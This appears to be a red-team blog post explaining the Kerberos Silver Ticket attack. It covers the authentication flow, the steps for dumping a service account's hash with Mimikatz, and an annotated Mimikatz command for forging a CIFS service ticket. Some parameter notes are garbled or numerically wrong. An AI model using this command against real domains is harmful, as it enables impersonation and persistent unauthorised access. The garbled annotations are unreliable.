---
title:  "Kerberos attacks 3-Silver Ticket "
classes: wide
header:
  teaser: /img/redteampng.png
ribbon: red
description: "Kerberos attacks 1-Silver Ticket"
categories:
  - Red-Teaming
toc: true
---

<img src="/img/silver/.PNG" alt="Getting-gz" width="1000" height="200"> 

## Silver Ticket
* A Silver Ticket is a forged Kerberos Ticket Granting Service (TGS) ticket
* A silver ticket attack involves compromising credentials and abusing the design of the Kerberos protocol. 
* A silver ticket only allows an attacker for forge ticket-granting service (TGS) tickets for specific services.
* TGS tickets are encrypted with the password hash for the service – therefore, if an adversary steals the hash for a service account they can mint TGS tickets for that service.
* A attacker can create a Silver Ticket by cracking a computer account password and using that to create a fake authentication ticket. Kerberos allows services to log in without double-checking that their token is actually valid, which attackers have exploited to create Silver Tickets.


## Kerberos Authentication Flow
  * 1-Password converted to NTLM hash, a timestamp is encrypted with the hash and sent to the KDC as an authenticator in the authentication ticket (TGT) request
  * 2-KDC checks user information and creates TGT
  * 3-The TGT is encrypted, delivered to the user. Only the KRBTGT in the domain can open and read TGT data.
  * 4-The User presents the TGT to the DC when requesting a TGS ticket ,The DC opens the TGT & validates PAC checksum 
       --> If the DC can open the ticket & the checksum check out, TGT = valid. The data in the TGT is effectively copied to create the TGS ticket.
  * 5-The TGS is encrypted using the target service accounts’ NTLM password hash and sent to the user 
  * 6.The user connects to the server hosting the service & presents the TGS,The service opens the TGS ticket using its NTLM password hash.

 

## Silver Ticket Attacks Work 
Silver Ticket Attacks are post-exploitation attacks. That means that a threat actor must already have compromised a target system in the environment before they can generate a Kerberos Silver Ticket.

  * 1-gather information about the domain, such as the domain name and domain security identifier (SID)
  * 2-Obtain the DNS name under which the service principal name (SPN) for the targeted
  * 3-Use Mimikatz to obtain the local NTLM password (or password hash) for the Kerberos service running on the compromised system
  * 4-Use Mimikatz to forge a Kerberos TGS


## Argument
```
    kerberos::golden  ##Name of the module (there is no Silver module!) 
    /User:Administrator  ##Username for which the TGT is generated 
    /domain :karim.net    ## Domain FQDN 
    /sid:S-1-5-21-268341927-4156871508-1792461683  SID of the domain 
    /target : dcorp-dc dol larcorp .moneycorp .local  Target server FQDN 
    /service: cifs  The SPN name of service for which TGS is to be created 
    /rc4:6f5b5acaf7433b3282ac22e21e62ff22  ## NTLM (RC4) hash of the service account. Use /aes128 and       /aes256 for using AES keys. 
    /id:500 /groups:512    ## Optional User RID (default 500) and Group (default 513 512 520 518 519) 
    ptt /  ##Injects the ticket in current PowerShell process, no  to save the ticket on disk 
    Persistence - Silver Ticket 

                /startoffset:0  Optional when the ticket is available (default 0 - right now) in minutes. Use           negative for a ticket available from past and a larger number for future.  
                /endin:600 ##Optional ticket lifetime (default is 10 years) in minutes. The default AD setting is          10 hours = 600 minutes
                /renewmax:10080 ##Optional ticket lifetime with renewal (default is 10 years) in minutes. The           default AD setting is 7 days = 100800 
                
 ```
